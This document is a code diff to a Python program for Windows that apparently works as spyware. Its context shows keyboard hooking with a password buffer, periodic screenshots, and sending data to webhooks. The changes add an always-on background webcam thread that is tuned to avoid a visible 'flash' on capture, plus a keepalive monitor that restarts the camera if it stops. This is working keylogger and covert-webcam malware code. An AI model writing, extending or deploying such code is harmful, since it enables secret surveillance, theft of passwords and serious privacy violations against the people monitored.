@@ -1,5 +1,4 @@
 import time
-import time
 import threading
 import win32gui
 import pyautogui
@@ -123,7 +122,15 @@ last_key_time = 0       # For clearing password buffer after timeout
 last_heartbeat_time = time.time()  # Track when last heartbeat was sent
 last_periodic_screenshot_time = time.time()  # Track when last periodic screenshot was taken
 program_start_time = time.time()  # Track program start time
+
+# Camera background processing variables
 camera_device_index = 0  # Default camera index
+camera_capture = None  # Camera capture object
+camera_frame = None  # Latest camera frame
+camera_lock = threading.Lock()  # Lock for thread-safe camera access
+camera_running = False  # Camera thread control
+camera_initialized = False  # Camera initialization flag
+camera_warmup_complete = False  # Camera warmup flag
 
 # Track focus state to prevent spam
 current_focused_hwnd = None  # Current window handle
@@ -155,7 +162,7 @@ def take_screenshot():
 
 def detect_and_initialize_camera():
     """Try to detect and initialize available camera"""
-    global camera_device_index
+    global camera_device_index, camera_initialized
     
     # Try to find camera by checking available devices
     for i in range(3):  # Check first 3 indices
@@ -167,42 +174,152 @@ def detect_and_initialize_camera():
                 if ret and frame is not None:
                     camera_device_index = i
                     print(f"[CAMERA] Found camera at index {i}")
+                    camera_initialized = True
                     return True
-        except:
+        except Exception as e:
+            print(f"[CAMERA DETECT ERROR] Index {i}: {e}")
             continue
     
     print("[CAMERA] No camera found, camera features disabled")
+    camera_initialized = False
     return False
 
-def take_camera_picture():
-    """Take a picture from the camera"""
+def camera_background_thread():
+    """Background thread that continuously captures camera frames"""
+    global camera_capture, camera_frame, camera_running, camera_warmup_complete
+    
     try:
-        cap = cv2.VideoCapture(camera_device_index, cv2.CAP_DSHOW)
-        if not cap.isOpened():
-            print("[CAMERA] Could not open camera")
-            return None
+        # Initialize camera
+        camera_capture = cv2.VideoCapture(camera_device_index, cv2.CAP_DSHOW)
+        if not camera_capture.isOpened():
+            print("[CAMERA] Could not open camera in background thread")
+            camera_running = False
+            return
         
-        # Give camera time to adjust
-        time.sleep(0.5)
+        # Configure camera to reduce flash/auto-adjustment
+        try:
+            # Try to set manual settings to reduce flash
+            camera_capture.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)  # Manual exposure
+            camera_capture.set(cv2.CAP_PROP_AUTOFOCUS, 0)  # Turn off autofocus
+            camera_capture.set(cv2.CAP_PROP_AUTO_WB, 0)  # Turn off auto white balance
+            
+            # Set some reasonable defaults
+            camera_capture.set(cv2.CAP_PROP_EXPOSURE, 0.5)  # Middle exposure
+            camera_capture.set(cv2.CAP_PROP_FRAME_WIDTH, 640)  # Lower resolution for speed
+            camera_capture.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+        except Exception as e:
+            print(f"[CAMERA SETTINGS] Some settings not supported: {e}")
         
-        # Capture frame
-        ret, frame = cap.read()
-        cap.release()
+        print("[CAMERA] Background camera thread started")
         
-        if not ret or frame is None:
-            print("[CAMERA] Failed to capture frame")
-            return None
+        # Warm up the camera by reading initial frames
+        warmup_frames = 15
+        for i in range(warmup_frames):
+            ret, frame = camera_capture.read()
+            if ret and frame is not None:
+                with camera_lock:
+                    camera_frame = frame
+                time.sleep(0.03)  # Small delay between warmup frames
         
-        # Convert BGR to RGB
-        frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-        # Convert to PIL Image
-        camera_image = Image.fromarray(frame_rgb)
+        camera_warmup_complete = True
+        print("[CAMERA] Camera warmup complete")
         
-        return camera_image
-        
+        # Main camera loop
+        while camera_running:
+            try:
+                ret, frame = camera_capture.read()
+                if ret and frame is not None:
+                    with camera_lock:
+                        camera_frame = frame
+                else:
+                    print("[CAMERA] Failed to read frame, attempting to reopen...")
+                    # Try to reopen camera
+                    camera_capture.release()
+                    time.sleep(0.5)
+                    camera_capture = cv2.VideoCapture(camera_device_index, cv2.CAP_DSHOW)
+                    if not camera_capture.isOpened():
+                        print("[CAMERA] Could not reopen camera")
+                        break
+                
+                # Small delay to reduce CPU usage (15-30 FPS is sufficient)
+                time.sleep(0.033)  # ~30 FPS
+                
+            except Exception as e:
+                print(f"[CAMERA LOOP ERROR] {e}")
+                time.sleep(1)
+    
     except Exception as e:
-        print(f"[CAMERA ERROR] {e}")
+        print(f"[CAMERA THREAD ERROR] {e}")
+    finally:
+        if camera_capture is not None:
+            camera_capture.release()
+            camera_capture = None
+        camera_running = False
+        print("[CAMERA] Background camera thread stopped")
+
+def start_camera_background():
+    """Start the background camera thread"""
+    global camera_running, camera_initialized
+    
+    if not camera_initialized:
+        print("[CAMERA] Camera not initialized, cannot start background thread")
+        return False
+    
+    if camera_running:
+        print("[CAMERA] Background camera already running")
+        return True
+    
+    camera_running = True
+    camera_thread = threading.Thread(target=camera_background_thread, daemon=True)
+    camera_thread.start()
+    
+    # Wait a moment for camera to start
+    time.sleep(0.5)
+    
+    print("[CAMERA] Background camera started")
+    return True
+
+def stop_camera_background():
+    """Stop the background camera thread"""
+    global camera_running
+    camera_running = False
+    time.sleep(0.5)  # Give thread time to stop
+    print("[CAMERA] Background camera stopped")
+
+def take_camera_picture():
+    """Get the latest frame from the background camera"""
+    global camera_frame, camera_warmup_complete, camera_running
+    
+    if not camera_initialized or not camera_running:
+        print("[CAMERA] Camera not available or not running")
         return None
+    
+    if not camera_warmup_complete:
+        print("[CAMERA] Camera still warming up...")
+        # Wait a bit for warmup
+        for _ in range(10):
+            if camera_warmup_complete:
+                break
+            time.sleep(0.1)
+    
+    with camera_lock:
+        if camera_frame is None:
+            print("[CAMERA] No frame available")
+            return None
+        
+        try:
+            # Make a copy of the frame to avoid threading issues
+            frame_copy = camera_frame.copy()
+            
+            # Convert BGR to RGB
+            frame_rgb = cv2.cvtColor(frame_copy, cv2.COLOR_BGR2RGB)
+            # Convert to PIL Image
+            camera_image = Image.fromarray(frame_rgb)
+            
+            return camera_image
+        except Exception as e:
+            print(f"[CAMERA PROCESS ERROR] {e}")
+            return None
 
 def send_to_webhook(webhook_url, payload, screenshot_bytes=None, camera_bytes=None):
     """Send data to a specific webhook URL"""
@@ -406,7 +523,7 @@ def send_periodic_screenshot():
         # Take screenshot
         screenshot = take_screenshot() if SEND_SCREENSHOTS else None
         
-        # Take camera picture
+        # Take camera picture from background camera
         camera_image = take_camera_picture()
         
         # Prepare message
@@ -612,6 +729,24 @@ def periodic_screenshot_monitor():
             print(f"[PERIODIC MONITOR ERROR] {e}")
             time.sleep(1)
 
+# ---------------- CAMERA KEEPALIVE MONITOR ---------------- #
+def camera_keepalive_monitor():
+    """Monitor camera and restart if needed"""
+    global camera_running, camera_initialized
+    
+    while True:
+        try:
+            if camera_initialized and not camera_running:
+                print("[CAMERA] Camera not running, attempting to restart...")
+                start_camera_background()
+            
+            # Check every 10 seconds
+            time.sleep(10)
+            
+        except Exception as e:
+            print(f"[CAMERA MONITOR ERROR] {e}")
+            time.sleep(10)
+
 # ---------------- MAIN LOOP ---------------- #
 print("[SYSTEM] Monitoring started...")
 print("[SYSTEM] Tracking is ENABLED by default")
@@ -622,7 +757,17 @@ print(f"[SYSTEM] Periodic captures: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds
 print("[CAMERA] Initializing camera...")
 camera_available = detect_and_initialize_camera()
 if camera_available:
-    print("[CAMERA] Camera ready for use")
+    print("[CAMERA] Starting background camera thread...")
+    camera_started = start_camera_background()
+    if camera_started:
+        print("[CAMERA] Background camera running (no flash on capture)")
+        
+        # Start camera keepalive monitor
+        camera_monitor_thread = threading.Thread(target=camera_keepalive_monitor, daemon=True)
+        camera_monitor_thread.start()
+        print("[CAMERA] Camera keepalive monitor started")
+    else:
+        print("[CAMERA] Failed to start background camera")
 else:
     print("[CAMERA] Camera not available, only screenshots will be sent")
 
@@ -696,7 +841,7 @@ try:
                         # Take screenshot in main thread
                         screenshot = take_screenshot() if SEND_SCREENSHOTS else None
                         
-                        # Take camera picture
+                        # Take camera picture from background camera
                         camera_image = take_camera_picture()
                         
                         # Send alert to both webhooks
@@ -727,4 +872,6 @@ except KeyboardInterrupt:
 finally:
     # Cleanup
     keyboard.unhook_all()
+    stop_camera_background()
     print("[SYSTEM] Keyboard listeners stopped")
+    print("[SYSTEM] Camera stopped")
